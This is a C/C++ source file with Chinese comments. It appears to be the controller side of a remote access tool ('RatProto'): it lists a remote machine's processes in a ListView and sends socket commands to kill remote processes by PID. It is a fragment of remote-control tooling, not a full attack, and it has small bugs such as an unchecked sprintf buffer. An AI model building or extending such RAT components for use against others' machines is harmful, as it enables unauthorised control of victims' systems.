#include "ProcInfo.h"

HWND hProcList = NULL;
//////////////////////////////////////////////////////////////////////////
//初始化列表
//////////////////////////////////////////////////////////////////////////
BOOL InitProcList(HWND hList)
{
	hProcList = hList;
	LVCOLUMN lvCol;
	char *szColumn[]= {"PID", "进程名称"};
	int width[]= {70,200};

	ZeroMemory(&lvCol, sizeof(LVCOLUMN));

	lvCol.mask= LVCF_TEXT | LVCF_SUBITEM | LVCF_WIDTH | LVCF_FMT;
	lvCol.fmt= LVCFMT_LEFT;
	ListView_SetExtendedListViewStyleEx(hList,0 , LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_HEADERDRAGDROP);

	for(int i=0; i<2; i++ )
	{
		lvCol.iSubItem= i;
		lvCol.cx= width[i];
		lvCol.pszText= szColumn[i];

		ListView_InsertColumn(hList, i, &lvCol);
	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//PROCVIEW封装函数
//////////////////////////////////////////////////////////////////////////
BOOL ProcView(SOCKET sockfd,int dwRecvSize)
{
	ListView_DeleteAllItems(hProcList);
	ProcInfo* pi = (ProcInfo*)(szRecvCmd+sizeof(RatProto));
	int count = (dwRecvSize-sizeof(RatProto))/sizeof(ProcInfo);
	LVITEM lvItem;
	lvItem.mask =  LVIF_TEXT;
	char temp[10] = {0};
	for (int i=0;i<count;i++)
	{
		lvItem.iItem = i;
		//Name
		lvItem.iSubItem = 0;
		sprintf(temp,"%d",pi->pid);
		lvItem.pszText = temp;
		ListView_InsertItem(hProcList,&lvItem);
		//Value
		lvItem.iSubItem = 1;
		lvItem.pszText = pi->Name;
		ListView_SetItem(hProcList,&lvItem);
		//下一条记录
		pi++;
	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//根据PID删除远程进程，PID=0时代表刷新进程
//////////////////////////////////////////////////////////////////////////
BOOL ProcDeleteA(SOCKET sockfd,HWND hDlg)
{
	BOOL bTrans = FALSE;
	//无符号数
	BOOL bSigned = FALSE;
	int pid = GetDlgItemInt(hDlg,IDC_EDIT1,&bTrans,bSigned);
	if (!bTrans)
	{
		MessageBox(hDlg,"输入有误！",NULL,NULL);
		return FALSE;
	}
	int dwSize = sizeof(RatProto)+sizeof(int);
	RatProto ratPro;
	ratPro.RatId = PROC_DELETE;
	ratPro.RatLen = dwSize;
	char pData[20] = {0};
	if (pData)
	{
		memcpy(pData,&ratPro,sizeof(RatProto));
		char* pStr = pData+sizeof(RatProto);
		memcpy(pStr,&pid,sizeof(int));
		SendCmd(sockfd,pData,dwSize);
	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//根据PID删除进程
//////////////////////////////////////////////////////////////////////////
BOOL ProcDelete(SOCKET sockfd,int pid)
{
	int dwSize = sizeof(RatProto)+sizeof(int);
	RatProto ratPro;
	ratPro.RatId = PROC_DELETE;
	ratPro.RatLen = dwSize;
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
	SendCmd(sockfd,(char*)(&pid),sizeof(int));


	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//返回删除结果
//////////////////////////////////////////////////////////////////////////
BOOL ProcReDel(SOCKET sockfd,int dwRecvSize)
{
	char* szMsg = (char*)(szRecvCmd+sizeof(RatProto));
	MessageBox(NULL,szMsg,NULL,NULL);

	return TRUE;
}